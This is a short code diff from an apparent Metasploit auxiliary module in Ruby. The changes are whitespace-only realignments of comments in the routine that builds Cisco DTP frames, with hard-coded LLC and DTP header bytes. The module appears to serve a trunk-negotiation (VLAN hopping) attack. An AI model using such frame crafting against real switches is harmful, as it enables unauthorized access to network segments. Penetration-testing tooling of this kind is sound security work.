@@ -43,11 +43,11 @@ class Metasploit3 < Msf::Auxiliary
     p.eth_daddr = '01:00:0c:cc:cc:cc'
     p.eth_saddr = smac
     llc_hdr =	"\xaa\xaa\x03\x00\x00\x0c\x20\x04"
-    dtp_hdr =	"\x01"															# version
-    dtp_hdr <<	"\x00\x01\x00\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00"			# domain
-    dtp_hdr <<	"\x00\x02\x00\x05\x03"											# status
-    dtp_hdr <<	"\x00\x03\x00\x05\x45"											# dtp type
-    dtp_hdr <<	"\x00\x04\x00\x0a" << PacketFu::EthHeader.mac2str(smac)			# neighbor
+    dtp_hdr =	"\x01"								# version
+    dtp_hdr <<	"\x00\x01\x00\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00"		# domain
+    dtp_hdr <<	"\x00\x02\x00\x05\x03"						# status
+    dtp_hdr <<	"\x00\x03\x00\x05\x45"						# dtp type
+    dtp_hdr <<	"\x00\x04\x00\x0a" << PacketFu::EthHeader.mac2str(smac)		# neighbor
     p.eth_proto = llc_hdr.length + dtp_hdr.length
     p.payload = llc_hdr << dtp_hdr
     p
